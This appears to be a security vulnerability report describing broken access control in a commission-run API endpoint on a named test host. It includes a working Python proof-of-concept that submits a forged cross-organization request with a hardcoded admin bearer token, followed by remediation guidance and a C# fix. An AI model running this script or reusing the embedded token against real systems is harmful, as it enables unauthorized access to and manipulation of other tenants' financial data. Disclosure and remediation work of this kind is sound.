# Broken Access Control in Commission Run Functionality Enables Cross-Organization Data Access

**ID:** vuln-0055
**Severity:** CRITICAL
**Found:** 2026-02-26 21:19:42 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission
**Method:** POST
**CWE:** CWE-284
**CVSS:** 9.9

## Description

A broken access control vulnerability was discovered in the commission run functionality that allows users to access and manipulate commission data across organizational boundaries. The `/api/CommissionRun/RunCommission` endpoint accepts `organizationId` and `clientId` parameters without proper validation, enabling unauthorized access to other organizations' sensitive commission data.

This vulnerability enables attackers to view, process, and potentially manipulate commission data belonging to other organizations, violating multi-tenant isolation and organizational boundaries. The issue stems from insufficient server-side validation of organization and client identifiers combined with missing function-level authorization checks.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Data Breach**: Unauthorized access to sensitive commission data from other organizations
2. **Financial Manipulation**: Processing commissions for other organizations, potentially leading to financial losses
3. **Business Intelligence Theft**: Access to competitors' commission structures and sales data
4. **Compliance Violations**: Violation of data protection regulations and multi-tenant isolation requirements
5. **Operational Disruption**: Unauthorized commission processing could disrupt business operations
6. **Reputation Damage**: Loss of trust from clients and partners due to data exposure

The business impact includes significant data exposure risks, potential financial losses through unauthorized commission processing, and regulatory compliance violations.

## Technical Analysis

The vulnerability exists in the `/api/CommissionRun/RunCommission` endpoint which lacks proper validation of organization and client identifiers. The system accepts user-supplied `organizationId` and `clientId` parameters without validating that the user has authorization to access the specified organization's data.

**Root Cause Analysis:**
1. **Missing Server-Side Validation**: No validation that the user belongs to the specified organization
2. **Insufficient Authorization Checks**: No function-level authorization checks for cross-organization access
3. **Parameter Tampering Vulnerability**: User-supplied parameters are trusted without validation
4. **Broken Tenant Isolation**: Multi-tenant isolation is not properly enforced

**Technical Details:**
- Endpoint: `POST /api/CommissionRun/RunCommission`
- Vulnerable Parameters: `organizationId` and `clientId`
- Exploitation Method: Manipulating `organizationId` and `clientId` parameters to access other organizations' data
- Expected Behavior: Users should only access data for their own organization
- Actual Behavior: Users can access data from any organization by manipulating parameters

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission run privileges
2. Send a POST request to `/api/CommissionRun/RunCommission` with manipulated `organizationId` and `clientId` parameters
3. Verify that commission data from the target organization is accessible
4. Confirm that commissions can be processed for the target organization

**Proof-of-Concept Steps:**
1. Identify target organization IDs through enumeration or information disclosure
2. Create a commission run request with manipulated organization parameters
3. Process the commission run for the target organization
4. Verify unauthorized access to the target organization's commission data

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
RUN_COMMISSION_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Authentication token (replace with valid token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Headers
headers = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

# Vulnerable commission run payload - accessing other organization's data
cross_org_payload = {
    "organizationId": 2,  # Target organization ID (different from user's organization)
    "clientId": 2,        # Target client ID
    "startDate": "2026-01-01",
    "endDate": "2026-12-31",
    "description": "Unauthorized commission run for target organization",
    "forceRun": True
}

def test_cross_organization_access():
    """Test cross-organization access in commission run functionality"""
    print("Testing cross-organization access vulnerability...")

    try:
        # Process commission run for target organization
        response = requests.post(
            RUN_COMMISSION_ENDPOINT,
            headers=headers,
            data=json.dumps(cross_org_payload),
            timeout=15
        )

        # Check response
        if response.status_code == 200:
            print(f"✓ SUCCESS: Commission run processed for target organization")
            print(f"Response: {response.text}")
            return True
        else:
            print(f"✗ FAILED: Status code {response.status_code}")
            print(f"Response: {response.text}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")
        return False

if __name__ == "__main__":
    success = test_cross_organization_access()
    if success:
        print("\nVULNERABILITY CONFIRMED: Cross-organization access is possible")
        print("Impact: This enables unauthorized access to other organizations' commission data")
    else:
        print("\nVulnerability not confirmed or error occurred during testing")
```

## Remediation

Implement comprehensive access control measures to prevent cross-organization data access:

1. **Server-Side Validation**:
   - Validate that the user belongs to the specified organization before processing requests
   - Implement proper validation for all organization and client identifiers
   - Add server-side checks to ensure users can only access their own organization's data

2. **Function-Level Authorization**:
   - Implement proper function-level authorization checks for all commission-related endpoints
   - Add role-based access control for commission processing
   - Implement proper tenant isolation in all commission-related functionality

3. **Tenant Isolation**:
   - Implement proper multi-tenant isolation in the commission management system
   - Add tenant context to all commission-related operations
   - Validate tenant boundaries in all data access operations

4. **Monitoring and Alerting**:
   - Implement monitoring for cross-organization access attempts
   - Set up alerts for suspicious commission processing patterns
   - Log and review all commission processing events with organization context

5. **Code Fix Example**:
```csharp
// Add validation in the commission run processing logic
public IActionResult RunCommission(CommissionRunDto runDto)
{
    // Get user's organization from authentication context
    var userOrganizationId = User.GetOrganizationId();

    // Validate that user belongs to the specified organization
    if (runDto.OrganizationId != userOrganizationId)
    {
        return Forbid("User does not have access to the specified organization");
    }

    // Validate client ID belongs to the specified organization
    if (!IsClientInOrganization(runDto.ClientId, runDto.OrganizationId))
    {
        return BadRequest("Client does not belong to the specified organization");
    }

    // Proceed with commission processing
    // ...
}
```

6. **Additional Recommendations**:
   - Conduct a comprehensive access control review of all commission-related endpoints
   - Implement data access layer filters to enforce tenant isolation
   - Add automated testing for access control vulnerabilities
   - Implement regular security audits of commission functionality

